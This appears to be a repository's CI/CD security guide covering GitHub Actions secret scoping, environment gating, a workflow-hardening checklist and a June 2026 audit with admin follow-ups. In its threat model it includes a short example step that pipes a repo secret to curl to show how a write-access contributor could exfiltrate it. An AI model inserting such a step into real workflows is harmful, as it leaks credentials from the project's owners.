# CI/CD & secrets security

How GitHub Actions secrets are scoped in this repo, the threat model for giving
contributors write access, and the rules to keep new workflows safe. For
vulnerability disclosure see the root `SECURITY.md`.

## The one rule that matters

**Write access = the ability to read every _repo-level_ secret.**

When someone has write (push) access, they can push a branch — or `workflow_dispatch`
a workflow against their branch — and GitHub runs _their_ version of the workflow
file with repo secrets injected. A two-line step (`echo "${{ secrets.X }}" | curl …`)
exfiltrates the secret. There is no review gate on this; the workflow runs on push.

The fork boundary you might be thinking of (forks get no secrets, read-only token)
**does not apply to collaborators** — they push branches, not forks.

The only thing that protects a secret from a write-access contributor is **storing
it in an Environment whose deployment-branch policy excludes their branches**
(here: the `Production` environment, restricted to `main`). A job reads an
environment secret only when it declares `environment: <name>` _and_ the run's ref
is allowed by that environment's branch policy.

### Repo-level secret + same-named environment secret = the repo one wins for ungated jobs

If a secret named `FOO` exists both at the repo level and in the `Production`
environment, a job _without_ `environment: Production` still gets the **repo-level**
`FOO`. So duplicating a gated secret at the repo level silently cancels the gating.
Don't do it. A secret belongs in exactly one place.

## Secret placement policy

| Sensitivity                          | Where it goes                                        | Examples                                                                                                                                                                         |
| ------------------------------------ | ---------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Production infra & app signing       | `Production` environment **only** (never repo-level) | `VERCEL_TOKEN`, `RAILWAY_TOKEN`, prod `DATABASE_URL`, `SENTRY_AUTH_TOKEN`, Android keystore, iOS p12/profiles, App Store Connect key, Google Play SA, `OTA_PUSH_APP_PRIVATE_KEY` |
| Needed on feature branches by design | Repo-level, but **must be low-blast-radius**         | `EXPO_TOKEN` (preview OTA), `CLAUDE_CODE_OAUTH_TOKEN`, test-account creds                                                                                                        |

If a workflow legitimately needs a high-value secret, gate its job with
`environment: Production` instead of copying the secret to the repo level.

`OTA_PUSH_APP_PRIVATE_KEY` deserves special care: it mints a `boardsesh-repo-bot`
token with `contents: write` that is on `main`'s pull-request-bypass allowlist.
Leaking it = push to `main` without review = read every `Production` secret. Keep it
environment-scoped.

## Adding a new workflow or secret — checklist

- Set an explicit least-privilege `permissions:` block. The repo default token is
  read-only; keep it that way and grant only what the job needs.
- Never interpolate untrusted input (`github.event.pull_request.title/body`,
  `head_ref`, issue/comment bodies, dispatch inputs) directly into a `run:` block.
  Pass it through `env:` and reference `"$VAR"`. See `ci.yml` for the pattern.
- New high-value secret? Put it in the `Production` environment and gate the job
  with `environment: Production`. Do **not** add it at the repo level "to make it
  work" on a branch.
- Pin every external action to a full commit SHA with a `# vX` comment. Dependabot
  (`github-actions` ecosystem) keeps the pins current.
- No `pull_request_target`. If you think you need it, you almost certainly don't —
  ask first.
- Self-hosted runners (`[self-hosted, homelab, …]`) run untrusted-from-a-branch
  code on our hardware. Any job on one must be gated by an `environment:` with
  required reviewers, and the runner kept in a restricted runner group. The
  `branch-deploy*` workflows are the only ones that target self-hosted and their
  push/PR triggers are currently disabled — keep it that way until the guardrails
  above are in place.

## Settings that back this up (verify these, they aren't in the YAML)

- **Default workflow token:** read-only, can't approve PRs. ✅
- **`main` branch protection:** require PR review (≥1), `require_last_push_approval`,
  required status checks (so red CI can't merge), and "Require review from Code
  Owners" (enforces `.github/CODEOWNERS`).
- **`Production` environment:** deployment branches = `main` only; add ≥1 required
  reviewer so a human approves before prod/store secrets are used.
- **No secret may live at both the repo level and the `Production` environment.**

## Audit — 2026-06-21

Triggered by a plan to grant more contributors write access. Full review of all 36
workflows plus live repo/environment settings.

**Already solid:** read-only default token; no `pull_request_target`; no script
injection (untrusted PR fields go through `env:`); fork PRs require approval and get
no secrets; production infra secrets (`VERCEL_TOKEN`, `RAILWAY_TOKEN`, prod
`DATABASE_URL`, `SENTRY_AUTH_TOKEN`, `DISCORD_DEPLOY_WEBHOOK`) are environment-only
and `main`-gated; force-push disabled; `require_last_push_approval` on.

**Fixed in the hardening PR:** all external actions SHA-pinned; `github-actions`
added to Dependabot; `.github/CODEOWNERS` added; the four workflows that consumed
signing/ASC/OTA secrets without gating (`android-release.yml`, `ios-testflight.yml`,
`mobile-screenshots-ios.yml`, `mobile-screenshots-android.yml`) now run their
secret-using job under `environment: Production`.

**Requires admin action (settings/secrets — tracked in the follow-up issue):**

1. Delete the **repo-level duplicates** of every secret also in `Production`
   (Android keystore + passwords, iOS p12 + password + provisioning profiles, App
   Store Connect key/id/issuer, Google Play SA JSON). They make the `Production`
   gating moot today. Do this only **after** the hardening PR merges.
2. Move `OTA_PUSH_APP_PRIVATE_KEY` into the `Production` environment; remove the
   repo-level copy.
3. Split `EXPO_TOKEN` into a least-privilege preview token (repo) and a separate
   production-channel token (`Production`), or accept that every write contributor
   can read the current one.
4. Replace the `ACKNOWLEDGEMENTS_GH_TOKEN` PAT with the existing `github.token`
   fallback (or a fine-grained, environment-scoped token); move `BRANCH_DEPLOY_*`
   secrets into an environment.
5. Branch protection: add required status checks + "Require review from Code
   Owners". `Production` environment: add a required reviewer.
6. Delete the stray empty `boardsesh / production` environment.
